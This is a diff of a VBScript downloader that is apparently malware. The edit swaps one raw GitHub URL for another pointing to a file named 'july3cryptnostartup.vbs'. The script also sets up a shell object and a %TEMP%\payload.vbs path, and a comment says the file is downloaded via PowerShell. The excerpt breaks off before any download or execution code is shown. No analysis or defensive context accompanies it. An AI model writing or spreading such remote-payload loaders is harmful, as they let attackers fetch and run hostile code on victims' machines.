@@ -1,7 +1,7 @@
 Set fso = CreateObject("Scripting.FileSystemObject")
 Set shell = CreateObject("WScript.Shell")
 
-url = "https://raw.githubusercontent.com/theredbruno/Service/refs/heads/main/generated_script__7_.vbs"
+url = "https://raw.githubusercontent.com/theredbruno/Service/refs/heads/main/july3cryptnostartup.vbs"
 vbsPath = shell.ExpandEnvironmentStrings("%TEMP%") & "\payload.vbs"
 
 ' Download the VBS file via PowerShell
